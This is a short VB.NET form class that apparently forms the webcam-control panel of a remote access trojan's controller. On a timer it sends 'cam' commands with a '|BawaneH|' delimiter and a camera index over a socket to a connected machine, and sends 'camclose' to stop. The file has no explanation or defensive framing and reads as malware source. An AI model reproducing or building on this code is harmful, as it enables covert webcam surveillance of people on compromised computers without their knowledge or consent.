Public Class Form12
    Public sock As Integer

    Private Sub Form12_FormClosing(ByVal sender As Object, ByVal e As System.Windows.Forms.FormClosingEventArgs) Handles Me.FormClosing
        Timer1.Stop()
        Form1.S.Send(sock, "camclose")
    End Sub

    Private Sub Button1_Click_1(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button1.Click
        Timer1.Start()
        Button1.Enabled = False
        Button2.Enabled = True
    End Sub

    Private Sub Form12_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        Button2.Enabled = False
    End Sub

    Private Sub Button2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button2.Click
        Timer1.Stop()
        Form1.S.Send(sock, "camclose")
        Button1.Enabled = True
        Button2.Enabled = False
    End Sub

    Private Sub Timer1_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer1.Tick
        Form1.S.Send(sock, "cam" & "|BawaneH|" & ComboBox1.SelectedIndex)
    End Sub
End Class